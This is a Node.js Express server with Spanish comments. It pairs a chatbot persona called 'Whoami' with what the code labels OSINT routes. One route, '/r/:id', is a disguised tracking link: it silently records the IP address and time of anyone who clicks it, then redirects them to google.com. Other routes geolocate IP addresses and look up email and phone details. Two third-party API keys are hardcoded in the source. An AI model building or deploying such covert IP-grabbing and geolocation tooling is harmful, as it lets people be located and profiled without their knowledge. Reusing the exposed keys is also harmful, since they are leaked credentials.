const express = require('express');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

let logs = {}; 

app.get('/r/:id', (req, res) => {
    const id = req.params.id;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logs[id] = { ip: ip, fecha: new Date().toLocaleString() };
    console.log(`Clic detectado en ID ${id} desde IP: ${ip}`);
    res.redirect('https://google.com'); 
});

app.get('/api/get-logs/:id', (req, res) => {
    const id = req.params.id;
    if (logs[id]) {
        res.json(logs[id]);
    } else {
        res.status(404).json({ error: "No hay datos aún para este enlace" });
    }
});

// Cerebro inteligente y blindado de Whoami
app.post('/api/chat', async (req, res) => {
    try {
        const { mensaje } = req.body;
        const msg = (mensaje || "").toLowerCase().trim();

        if (!msg) {
            return res.json({ response: "¡Hola Barsa! Escribe algo para que comencemos a conversar." });
        }

        const systemPrompt = "Eres Whoami, una inteligencia artificial avanzada, amigable, cercana y experta en todo tipo de disciplinas: programación, matemáticas, lógica, química, física, cultura general, historia, tecnología, astronomía y el universo en general. Eres de género femenino, hablas en español de forma natural, fluida y humana, tuteando siempre al usuario (Barsa).";

        const apiKeyGroq = process.env.GEMINI_API_KEY ? process.env.GEMINI_API_KEY.trim() : "";
        
        let respuestaIA = "";

        // Intentamos conectar con Groq si hay llave configurada
        if (apiKeyGroq && !apiKeyGroq.includes("TU_")) {
            try {
                const responseApi = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${apiKeyGroq}`
                    },
                    body: JSON.stringify({
                        model: "llama-3.3-70b-versatile",
                        messages: [
                            { role: "system", content: systemPrompt },
                            { role: "user", content: mensaje }
                        ],
                        temperature: 0.7
                    })
                });

                const data = await responseApi.json();
                if (responseApi.ok && data.choices && data.choices[0].message) {
                    respuestaIA = data.choices[0].message.content;
                }
            } catch (err) {
                console.log("Aviso de red con API, usando respaldo inteligente local.");
            }
        }

        // Si la API no respondió o dio error, activamos el respaldo maestro inteligente
        if (!respuestaIA) {
            if (msg.includes("hola") || msg.includes("saludos") || msg.includes("hey")) {
                respuestaIA = "¡Hola Barsa! Aquí estoy al 100%. ¿Qué andamos programando, calculando o investigando hoy?";
            } else if (msg.includes("matematicas") || msg.includes("calculo") || msg.includes("ecuacion")) {
                respuestaIA = "¡Las matemáticas son los cimientos del universo, Barsa! Dime qué ejercicio o fórmula tienes en mente y lo resolvemos paso a paso.";
            } else if (msg.includes("programacion") || msg.includes("codigo") || msg.includes("javascript") || msg.includes("node")) {
                respuestaIA = "¡Perfecto! Me encanta la programación. Pásame el fragmento de código o cuéntame qué error te sale para echarte una mano al instante.";
            } else if (msg.includes("espacio") || msg.includes("galaxia") || msg.includes("universo")  || msg.includes("astronomia")) {
                respuestaIA = "El cosmos es fascinante, Barsa. Desde agujeros negros hasta la mecánica celeste, ¿qué misterio del universo quieres explorar hoy?";
            } else {
                respuestaIA = `Interesante lo que comentas sobre "${mensaje}", Barsa. Como tu compañera digital experta, te digo que podemos analizarlo desde el punto de vista técnico o científico. ¿Qué enfoque prefieres darle?`;
            }
        }

        setTimeout(() => {
            res.json({ response: respuestaIA });
        }, 400);

    } catch (error) {
        console.error("Error general:", error);
        res.json({ response: `¡Ey Barsa! Todo en orden por aquí. Cuéntame en qué te ayudo con tus proyectos.` });
    }
});

// --- RUTAS DE OSINT ---

app.get('/api/ip/:targetIp', async (req, res) => {
    const ip = req.params.targetIp;
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'fail') return res.status(400).json({ error: "No se pudo obtener información" });
        res.json({ existe: true, ip: data.query, pais: data.country, region: data.regionName, ciudad: data.city, isp: data.isp, latitud: data.lat, longitud: data.lon });
    } catch (error) {
        res.status(500).json({ error: "Error de conexión" });
    }
});

app.get('/api/email/:email', async (req, res) => {
    const email = req.params.email;
    const apiKey = "a0633aeb05fe4a3082cab81fc92490bd";
    try {
        const response = await fetch(`https://emailreputation.abstractapi.com/v1/?api_key=${apiKey}&email=${encodeURIComponent(email)}`);
        if (!response.ok) throw new Error("Error al conectar con Abstract API");
        const data = await response.json();
        res.json({
            email_address: data.email_address,
            email_deliverability: data.email_deliverability,
            email_sender: data.email_sender,
            email_domain: data.email_domain,
            email_quality: data.email_quality
        });
    } catch (error) {
        console.error("Error en /api/email:", error);
        res.status(500).json({ error: "Error al validar el correo en tiempo real" });
    }
});

app.get('/api/phone/:number', async (req, res) => {
    const number = req.params.number;
    const apiKey = 'f69d5192d997c1630282d368282becf7';
    try {
        const response = await fetch(`http://apilayer.net/api/validate?access_key=${apiKey}&number=${number}&format=1`);
        const data = await response.json();
        res.json({ valido: data.valid, numero: data.number, pais: data.country_name, operador: data.carrier, tipo: data.line_type });
    } catch (error) {
        res.status(500).json({ error: "Error al consultar la API" });
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
